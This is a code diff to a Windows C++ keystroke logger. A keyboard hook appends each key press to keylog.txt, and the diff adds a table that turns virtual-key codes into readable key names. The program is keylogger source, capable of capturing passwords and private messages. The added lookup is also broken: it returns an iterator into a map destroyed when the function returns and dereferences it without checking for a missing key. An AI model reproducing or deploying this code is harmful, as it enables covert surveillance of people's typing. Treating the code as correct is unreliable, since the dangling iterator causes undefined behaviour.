@@ -1,20 +1,149 @@
 #include <Windows.h>
-#include <Shellapi.h>
 #include <fstream>
+#include <map>
+
+using namespace std;
 
 // Global variables
 std::ofstream logFile;
 HHOOK keyboardHook = NULL;
 NOTIFYICONDATA notifyIconData;
 
+auto getVKCodeValue(DWORD vkCode) {
+    map <DWORD, string> vkcodes;
+    vkcodes[1] = "Left mouse button";
+    vkcodes[2] = "Right mouse button";
+    vkcodes[3] = "Control-break processing";
+    vkcodes[4] = "Middle mouse button (three-button mouse)";
+    vkcodes[5] = "WIN 2000: X1 mouse button";
+    vkcodes[6] = "WIN 2000: X2 mouse button";
+    vkcodes[7] = "Undefined";
+    vkcodes[8] = "BckS";
+    vkcodes[9] = "TAB";
+    vkcodes[12] = "CLEAR";
+    vkcodes[13] = "ENTER";
+    vkcodes[16] = "SHIFT";
+    vkcodes[17] = "CTRL";
+    vkcodes[18] = "ALT";
+    vkcodes[19] = "PAUSE";
+    vkcodes[20] = "CAPS LOCK";
+    vkcodes[21] = "IME Kana mode";
+    vkcodes[22] = "IME Hanguel mode";
+    vkcodes[23] = "IME Hangul mode";
+    vkcodes[24] = "IME Junja mode";
+    vkcodes[25] = "IME final mode";
+    vkcodes[26] = "IME Hanja mode";
+    vkcodes[27] = "ESC";
+    vkcodes[28] = "IME convert";
+    vkcodes[29] = "IME nonconvert";
+    vkcodes[30] = "IME accept";
+    vkcodes[31] = "IME mode change request";
+    vkcodes[32] = " ";
+    vkcodes[33] = "PUP";
+    vkcodes[34] = "PDOWN";
+    vkcodes[35] = "END";
+    vkcodes[36] = "HOME";
+    vkcodes[37] = "LARR";
+    vkcodes[38] = "UARR";
+    vkcodes[39] = "RARR";
+    vkcodes[40] = "DARR";
+    vkcodes[41] = "SELECT";
+    vkcodes[42] = "PRINT";
+    vkcodes[43] = "EXECUTE";
+    vkcodes[44] = "PRTSC";
+    vkcodes[45] = "INS";
+    vkcodes[46] = "DEL";
+    vkcodes[47] = "HELP";
+    vkcodes[48] = "0";
+    vkcodes[49] = "1";
+    vkcodes[50] = "2";
+    vkcodes[51] = "3";
+    vkcodes[52] = "4";
+    vkcodes[53] = "5";
+    vkcodes[54] = "6";
+    vkcodes[55] = "7";
+    vkcodes[56] = "8";
+    vkcodes[57] = "9";
+    vkcodes[65] = "A";
+    vkcodes[66] = "B";
+    vkcodes[67] = "C";
+    vkcodes[68] = "D";
+    vkcodes[69] = "E";
+    vkcodes[70] = "F";
+    vkcodes[71] = "G";
+    vkcodes[72] = "H";
+    vkcodes[73] = "I";
+    vkcodes[74] = "J";
+    vkcodes[75] = "K";
+    vkcodes[76] = "L";
+    vkcodes[77] = "M";
+    vkcodes[78] = "N";
+    vkcodes[79] = "O";
+    vkcodes[80] = "P";
+    vkcodes[81] = "Q";
+    vkcodes[82] = "R";
+    vkcodes[83] = "S";
+    vkcodes[84] = "T";
+    vkcodes[85] = "U";
+    vkcodes[86] = "V";
+    vkcodes[87] = "W";
+    vkcodes[88] = "X";
+    vkcodes[89] = "Y";
+    vkcodes[90] = "Z";
+    vkcodes[91] = "LWIN";
+    vkcodes[92] = "RWIN";
+    vkcodes[93] = "APP";
+    vkcodes[94] = "Reserved";
+    vkcodes[95] = "Computer Sleep";
+    vkcodes[96] = "NUMPAD0";
+    vkcodes[97] = "NUMPAD1";
+    vkcodes[98] = "NUMPAD2";
+    vkcodes[99] = "NUMPAD3";
+    vkcodes[100] = "NUMPAD4";
+    vkcodes[101] = "NUMPAD5";
+    vkcodes[102] = "NUMPAD6";
+    vkcodes[103] = "NUMPAD7";
+    vkcodes[104] = "NUMPAD8";
+    vkcodes[105] = "NUMPAD9";
+    vkcodes[106] = "Multiply";
+    vkcodes[107] = "Add";
+    vkcodes[108] = "Separator";
+    vkcodes[109] = "Subtract";
+    vkcodes[110] = "Decimal";
+    vkcodes[111] = "Divide";
+    vkcodes[112] = "F1";
+    vkcodes[113] = "F2";
+    vkcodes[114] = "F3";
+    vkcodes[115] = "F4";
+    vkcodes[116] = "F5";
+    vkcodes[117] = "F6";
+    vkcodes[118] = "F7";
+    vkcodes[119] = "F8";
+    vkcodes[120] = "F9";
+    vkcodes[121] = "F10";
+    vkcodes[122] = "F11";
+    vkcodes[123] = "F12";
+    vkcodes[124] = "F13";
+    vkcodes[125] = "F14";
+    vkcodes[126] = "F15";
+    vkcodes[127] = "F16";
+    vkcodes[144] = "NUMLOCK";
+    vkcodes[160] = "LSHIFT";
+    vkcodes[161] = "RSHIFT";
+    vkcodes[162] = "LCNTRL";
+    vkcodes[163] = "RCNTRL";
+
+    return vkcodes.find(vkCode);
+}
+
 // Function to handle key press and write to log file
 void HandleKeyPress(DWORD vkCode)
 {
     // Open the log file in append mode
-    logFile.open("keylog.txt", std::ios_base::app);
+    logFile.open("keylog.txt", ios_base::app);
 
     // Write the key code to the log file
-    logFile << vkCode << std::endl;
+    logFile << getVKCodeValue(vkCode)->second;
 
     // Close the log file
     logFile.close();
